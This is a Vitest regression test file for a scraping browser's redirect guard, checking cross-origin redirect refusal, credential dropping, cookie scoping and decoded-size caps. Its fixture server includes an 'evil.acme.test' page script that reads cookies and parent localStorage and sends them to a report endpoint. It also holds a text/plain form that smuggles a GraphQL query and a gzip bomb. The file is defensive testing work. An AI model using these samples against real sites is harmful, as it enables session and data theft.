import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { gzipSync } from "node:zlib";
import type { BrowserSession } from "@offerfinch/core/scrape/browser";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { fixtureBrowser, siteBrowser } from "./browser";

/**
 * Codex review of PR #149 (2026-11-09, after the guard began following redirects itself,
 * `followChecked`), three P1s:
 * 1. A frame or subresource that redirected was fulfilled under its first URL, so it took the first
 *    URL's origin: a frame on `boards.acme.test` redirected to `evil.acme.test` read the board's
 *    cookies and the parent's localStorage and posted them as the board.
 * 2. The final hop's `Set-Cookie` was applied to the first host on fulfill (`localhost` →
 *    `127.0.0.1` put the final host's cookie on both, and a `Domain=localhost` cookie appeared).
 * 3. Each hop rebuilt its headers from the first request, so after A → B dropped `Authorization`,
 *    a further B → B hop sent it again.
 * And: a fetched hop's body was buffered without a limit.
 *
 * Codex, next round (2026-11-09): a main-frame POST (a form's) answered 307 or 308 to another,
 * even allowed, origin was followed and fulfilled under the first URL, so the other site's page
 * ran as the first (its cookies and localStorage); in a read-only session a `text/plain` form
 * spelled out a body that passed as a GraphQL query. And the size cap read `content-length`, the
 * compressed size: a small gzip decoded past it.
 */
let server: Server;
let port = 0;
const hits: string[] = [];
/** The `authorization` header each request arrived with, by "METHOD host/path". */
const credentials = new Map<string, string>();
/** What the evil frame managed to read, from its `/report` query. */
const reports: string[] = [];
const BIG = 26 * 1024 * 1024;
/** 26 MiB of "a", gzipped: a few dozen KiB on the wire. */
const BIG_GZ = gzipSync(Buffer.alloc(BIG, 97));
// Literal, not the module's constants: the same file runs against the code before the fix.
const CROSS_ORIGIN_REFUSED = "cross-origin redirect refused";
const TOO_LARGE_REFUSED = "answer too large, refused";
const REDIRECT_FOLLOWED = "redirect followed";

/** The fixed answers of the POST-redirect and decoded-size cases, or null for any other path. */
function fixedPage(
	path: string,
	url: string,
): { headers: Record<string, string>; body: string | Buffer } | null {
	if (path === "/big-gz")
		return {
			headers: {
				"content-type": "application/octet-stream",
				"content-encoding": "gzip",
				"content-length": String(BIG_GZ.byteLength),
			},
			body: BIG_GZ,
		};
	if (path === "/form") {
		const to = new URL(url, "http://x").searchParams.get("to");
		// A text/plain form: the field's name and value spell out a GraphQL query.
		return {
			headers: { "content-type": "text/html" },
			body: `<html><body><form id="f" method="post" enctype="text/plain" action="/${to}"><input name='{"query":"query {jobs}","pad":"' value='"}'></form></body></html>`,
		};
	}
	if (path === "/post-landed")
		return {
			headers: { "content-type": "text/html" },
			body: "<html><body><h1>landed</h1></body></html>",
		};
	return null;
}

beforeAll(async () => {
	server = createServer((req, res) => {
		const host = String(
			req.headers["x-fixture-host"] ?? req.headers.host ?? "",
		).replace(/:\d+$/, "");
		const path = (req.url ?? "").split("?")[0] ?? "";
		const hit = `${req.method} ${host}${path}`;
		hits.push(hit);
		if (req.headers.authorization)
			credentials.set(hit, req.headers.authorization);
		if (path === "/report") reports.push(req.url ?? "");
		const at = (name: string, to: string) => `http://${name}:${port}${to}`;
		const redirects: Record<string, [number, string]> = {
			"/frame-evil": [302, at("evil.acme.test", "/steal")],
			"/frame-same": [302, "/frame-hop"],
			"/frame-hop": [302, "/frame-landed"],
			"/fetch-evil": [302, at("evil.acme.test", "/data")],
			"/fetch-same": [307, "/fetch-same-2"],
			"/fetch-same-2": [307, "/data"],
			// A → B → B: B must never see the credential, however many hops it takes.
			"/auth-chain": [302, at("cdn.acme.test", "/auth-2")],
			"/auth-2": [302, at("cdn.acme.test", "/data")],
			// A → B → A: back on the first origin, the dropped credential stays dropped.
			"/auth-back": [302, at("cdn.acme.test", "/auth-back-2")],
			"/auth-back-2": [302, at("boards.acme.test", "/data")],
			"/big-chain": [302, "/big"],
			// A form's POST sent on to another (allowed) origin, or kept on its own.
			"/post-307": [307, at("cdn.acme.test", "/landing")],
			"/post-308": [308, at("cdn.acme.test", "/landing")],
			"/post-same": [307, "/post-landed"],
		};
		const redirect = redirects[path];
		res.setHeader("access-control-allow-origin", "*");
		res.setHeader(
			"access-control-allow-headers",
			"content-type, authorization",
		);
		if (req.method === "OPTIONS") {
			res.writeHead(204);
			return res.end();
		}
		if (redirect) {
			res.writeHead(redirect[0], { location: redirect[1] });
			return res.end();
		}
		if (path === "/data") {
			res.writeHead(200, { "content-type": "application/json" });
			return res.end(JSON.stringify({ ok: true, host, method: req.method }));
		}
		if (path === "/big") {
			res.writeHead(200, { "content-type": "application/octet-stream" });
			return res.end(Buffer.alloc(BIG, 97));
		}
		const fixed = fixedPage(path, req.url ?? "");
		if (fixed) {
			res.writeHead(200, fixed.headers);
			return res.end(fixed.body);
		}
		if (path === "/landing" || path === "/steal") {
			res.writeHead(200, { "content-type": "text/html" });
			return res.end(`<html><body><script>
				let stored = "";
				try { stored = parent.localStorage.getItem("secret") ?? ""; } catch (e) { stored = "blocked"; }
				fetch("/report?cookie=" + encodeURIComponent(document.cookie) + "&stored=" + encodeURIComponent(stored));
			</script></body></html>`);
		}
		if (path === "/frame-landed") {
			res.writeHead(200, { "content-type": "text/html" });
			return res.end(
				`<html><body><script>fetch("/landed-ran?origin=" + encodeURIComponent(location.origin));</script></body></html>`,
			);
		}
		res.writeHead(200, { "content-type": "text/html" });
		res.end("<html><body>probe</body></html>");
	});
	await new Promise<void>((resolve) => server.listen(0, resolve));
	port = (server.address() as AddressInfo).port;
});

afterAll(async () => {
	await new Promise<void>((resolve) => server.close(() => resolve()));
});

beforeEach(() => {
	hits.length = 0;
	credentials.clear();
	reports.length = 0;
});

type Page = Awaited<ReturnType<BrowserSession["newPage"]>>;

async function withBoard<T>(
	network: "read_only" | "allowlist",
	run: (page: Page) => Promise<T>,
): Promise<T> {
	const session = await siteBrowser(port).openSession({
		network,
		allowedHosts: ["boards.acme.test", "cdn.acme.test", "evil.acme.test"],
		refusePrivateNetwork: true,
	});
	try {
		const page = await session.newPage();
		await page.goto(`http://boards.acme.test:${port}/main`);
		await page.evaluate(
			`document.cookie = "board=secret-cookie; path=/"; localStorage.setItem("secret", "secret-storage")`,
		);
		return await run(page);
	} finally {
		await session.close();
	}
}

const frame = (src: string) => `(() => {
	const frame = document.createElement("iframe");
	frame.src = ${JSON.stringify(src)};
	document.body.appendChild(frame);
})()`;

describe.each(["read_only", "allowlist"] as const)(
	"%s: a redirect is never fulfilled under another origin",
	(network) => {
		it("refuses a frame redirected to another origin: it reads nothing of the board", async () => {
			const log = await withBoard(network, async (page) => {
				await page.evaluate(frame("/frame-evil"));
				await page.waitForTimeout(1_500);
				return page.networkLog();
			});
			expect(reports, JSON.stringify(reports)).toEqual([]);
			expect(hits).not.toContain("GET boards.acme.test/report");
			expect(hits).not.toContain("GET evil.acme.test/report");
			expect(
				log.find(
					(e) =>
						!e.allowed &&
						e.url === `http://evil.acme.test:${port}/steal` &&
						e.reason === CROSS_ORIGIN_REFUSED,
				),
				JSON.stringify(log),
			).toBeDefined();
		});

		it("refuses a fetch redirected to another origin", async () => {
			const answer = await withBoard(network, (page) =>
				page.evaluate<string>(
					`fetch("/fetch-evil").then((r) => r.text(), (e) => "failed: " + e.message)`,
				),
			);
			expect(answer).toMatch(/^failed/);
		});

		it("still follows a chain that stays on the first origin (fetch and frame)", async () => {
			const answer = await withBoard(network, async (page) => {
				const data = await page.evaluate(
					`fetch("/fetch-same", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ query: "query { jobs }" }) }).then((r) => r.json())`,
				);
				await page.evaluate(frame("/frame-same"));
				await page.waitForTimeout(1_500);
				return { data, log: page.networkLog() };
			});
			expect(answer.data).toEqual({
				ok: true,
				host: "boards.acme.test",
				method: "POST",
			});
			expect(hits).toContain("GET boards.acme.test/landed-ran");
			expect(
				answer.log.filter((e) => e.reason === REDIRECT_FOLLOWED).length,
			).toBeGreaterThanOrEqual(4);
		});

		it("never sends a dropped credential again, however many hops follow", async () => {
			await withBoard(network, (page) =>
				page.evaluate(`Promise.all([
					fetch("/auth-chain", { headers: { authorization: "Bearer SECRET" } }).catch(() => {}),
					fetch("/auth-back", { headers: { authorization: "Bearer SECRET" } }).catch(() => {}),
				])`),
			);
			expect(hits).toEqual(
				expect.arrayContaining([
					"GET cdn.acme.test/auth-2",
					"GET cdn.acme.test/data",
					"GET cdn.acme.test/auth-back-2",
					"GET boards.acme.test/data",
				]),
			);
			expect(credentials.get("GET boards.acme.test/auth-chain")).toBe(
				"Bearer SECRET",
			);
			expect(credentials.get("GET boards.acme.test/auth-back")).toBe(
				"Bearer SECRET",
			);
			expect(credentials.has("GET cdn.acme.test/auth-2")).toBe(false);
			expect(credentials.has("GET cdn.acme.test/data")).toBe(false);
			expect(credentials.has("GET cdn.acme.test/auth-back-2")).toBe(false);
			expect(credentials.has("GET boards.acme.test/data")).toBe(false);
		});

		it("refuses a fetched answer larger than the cap, quietly", async () => {
			const { answer, log } = await withBoard(network, async (page) => ({
				answer: await page.evaluate<string>(
					`fetch("/big-chain").then((r) => r.text().then((t) => "read " + t.length), (e) => "failed: " + e.message)`,
				),
				log: page.networkLog(),
			}));
			expect(answer).toMatch(/^failed/);
			expect(
				log.find(
					(e) =>
						!e.allowed &&
						e.url.endsWith("/big") &&
						e.reason === TOO_LARGE_REFUSED,
				),
				JSON.stringify(log),
			).toBeDefined();
		});

		it("measures the decoded body, not content-length: a small gzip over the cap is refused", async () => {
			const { answer, log } = await withBoard(network, async (page) => ({
				answer: await page.evaluate<string>(
					`fetch("/big-gz").then((r) => r.text().then((t) => "read " + t.length), (e) => "failed: " + e.message)`,
				),
				log: page.networkLog(),
			}));
			expect(BIG_GZ.byteLength).toBeLessThan(1024 * 1024);
			expect(answer).toMatch(/^failed/);
			expect(
				log.find(
					(e) =>
						!e.allowed &&
						e.url.endsWith("/big-gz") &&
						e.reason === TOO_LARGE_REFUSED,
				),
				JSON.stringify(log),
			).toBeDefined();
		});

		it.each(["post-307", "post-308"])(
			"%s: a form's POST redirected to another allowed origin is refused before it is fetched",
			async (to) => {
				const { log, url } = await withBoard(network, async (page) => {
					await page.goto(`http://boards.acme.test:${port}/form?to=${to}`);
					await page.evaluate(`document.getElementById("f").submit()`);
					await page.waitForTimeout(1_500);
					return { log: page.networkLog(), url: page.url() };
				});
				const posts = hits.filter((h) => h.startsWith("POST "));
				// A read never sends a form's POST, even one that spells out a GraphQL query; a
				// submission sends it once, to the form's own site, and never on.
				expect(posts).toEqual(
					network === "read_only" ? [] : [`POST boards.acme.test/${to}`],
				);
				expect(hits.filter((h) => h.includes("cdn.acme.test"))).toEqual([]);
				expect(reports, JSON.stringify(reports)).toEqual([]);
				expect(url).not.toContain("cdn.acme.test");
				if (network === "allowlist")
					expect(
						log.find(
							(e) =>
								!e.allowed &&
								e.url === `http://cdn.acme.test:${port}/landing` &&
								e.reason ===
									"main-frame POST redirected to another origin, refused",
						),
						JSON.stringify(log),
					).toBeDefined();
			},
		);
	},
);

describe("allowlist: a form's POST redirected on its own origin", () => {
	it("is still followed: the 307 sends it once more, to the same site", async () => {
		const { url, text } = await withBoard("allowlist", async (page) => {
			await page.goto(`http://boards.acme.test:${port}/form?to=post-same`);
			await page.evaluate(`document.getElementById("f").submit()`);
			await page.waitForTimeout(1_500);
			return {
				url: page.url(),
				text: await page.evaluate<string>("document.body.innerText"),
			};
		});
		expect(hits.filter((h) => h.startsWith("POST "))).toEqual([
			"POST boards.acme.test/post-same",
			"POST boards.acme.test/post-landed",
		]);
		expect(text).toContain("landed");
		expect(url).toContain("boards.acme.test");
	});
});

describe("allowlist: cookies of a followed hop", () => {
	let cookieServer: Server;
	let cookiePort = 0;
	const cookieHits: string[] = [];

	beforeAll(async () => {
		cookieServer = createServer((req, res) => {
			const path = (req.url ?? "").split("?")[0] ?? "";
			const host = (req.headers.host ?? "").replace(/:\d+$/, "");
			cookieHits.push(`${req.method} ${host}${path}`);
			if (path === "/post-chain" || path === "/fetch-chain") {
				res.writeHead(307, {
					location: `http://127.0.0.1:${cookiePort}/mid`,
				});
				return res.end();
			}
			if (path === "/mid") {
				// Back to the first origin: the chain ends where it began, so it is followed.
				res.writeHead(307, {
					location: `http://localhost:${cookiePort}/final`,
					"set-cookie": "mid=1; Path=/",
				});
				return res.end();
			}
			if (path === "/final") {
				res.writeHead(200, {
					"content-type": "text/html",
					"set-cookie": [
						"hop=final; Path=/",
						"dom=x; Path=/; Domain=127.0.0.1",
					],
				});
				return res.end("<html><body>sent</body></html>");
			}
			res.writeHead(200, { "content-type": "text/html" });
			res.end(
				`<html><body><form method="post" action="/post-chain"><input name="a" value="b"><button>Send</button></form></body></html>`,
			);
		});
		await new Promise<void>((resolve) =>
			cookieServer.listen(0, "127.0.0.1", resolve),
		);
		cookiePort = (cookieServer.address() as AddressInfo).port;
	});

	afterAll(async () => {
		await new Promise<void>((resolve) => cookieServer.close(() => resolve()));
	});

	beforeEach(() => {
		cookieHits.length = 0;
	});

	async function withCookieSession<T>(run: (page: Page) => Promise<T>) {
		const session = await fixtureBrowser().openSession({
			network: "allowlist",
			allowedHosts: ["localhost", "127.0.0.1"],
		});
		try {
			return await run(await session.newPage());
		} finally {
			await session.close();
		}
	}

	it("stores each hop's cookies on that hop's own host only", async () => {
		await withCookieSession(async (page) => {
			await page.goto(`http://localhost:${cookiePort}/form`);
			await page.evaluate(`fetch("/fetch-chain").then((r) => r.text())`);
			const log = page.networkLog();
			expect(
				log.filter((e) => e.reason === REDIRECT_FOLLOWED).map((e) => e.url),
			).toEqual([
				`http://127.0.0.1:${cookiePort}/mid`,
				`http://localhost:${cookiePort}/final`,
			]);
			const onFirst = await page.evaluate<string>("document.cookie");
			await page.goto(`http://127.0.0.1:${cookiePort}/form`);
			const onHop = await page.evaluate<string>("document.cookie");
			// The fetch context shares the browser context's cookie store: each hop's own cookies
			// are there, against the hop's real host; a cookie for a domain the hop is not on is
			// stored nowhere.
			expect(onFirst).toBe("hop=final");
			expect(onHop).toBe("mid=1");
		});
	});

	it("a form's 307 POST to another origin is refused before it is fetched: no hop, no cookie", async () => {
		await withCookieSession(async (page) => {
			await page.goto(`http://localhost:${cookiePort}/form`);
			await page.evaluate(`document.querySelector("form").submit()`);
			await page.waitForTimeout(1_500);
			expect(cookieHits.filter((h) => h.startsWith("POST "))).toEqual([
				"POST localhost/post-chain",
			]);
			expect(cookieHits).not.toContain("POST 127.0.0.1/mid");
			await page.goto(`http://127.0.0.1:${cookiePort}/form`);
			expect(await page.evaluate<string>("document.cookie")).toBe("");
		});
	});
});
